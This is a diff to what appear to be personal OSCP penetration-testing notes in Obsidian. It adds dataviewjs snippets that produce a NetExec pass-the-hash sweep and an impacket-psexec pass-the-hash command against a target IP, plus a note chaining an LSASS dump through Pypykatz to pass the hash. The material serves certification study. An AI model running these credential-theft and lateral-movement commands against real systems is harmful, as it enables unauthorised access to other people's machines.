@@ -248,6 +248,14 @@ const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u 
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+user and hash
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u users -H [hash]`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 In NetExec (and its predecessor CrackMapExec), seeing (Pwn3d!) next to a set of credentials means that the provided username and password are valid and possess administrative or code execution privileges on that target
 
 [[5985 5986 WinRM]]
@@ -420,6 +428,11 @@ Transfer [[Rubeus.exe]] into VICTIM TARGET
 Once Creds are obtained, use [[Runas]]
 
 ---
+
+### LSASS
+
+LSASS.dmp > Pypykatz > NT hash > Pass the Hash
+
 # Pivoting
 
 Check which ports are open in the target but not on KALI ATTACKER
@@ -496,6 +509,14 @@ Now that we have these credentials we can run `psexec.py`. This `impacket` to
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `impacket-psexec ${discoveredDomain}/Administrator:'[PW}'@${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Pass the hash psexec
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `impacket-psexec ${discoveredDomain}/Administrator@${ip} -hashes [hash]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
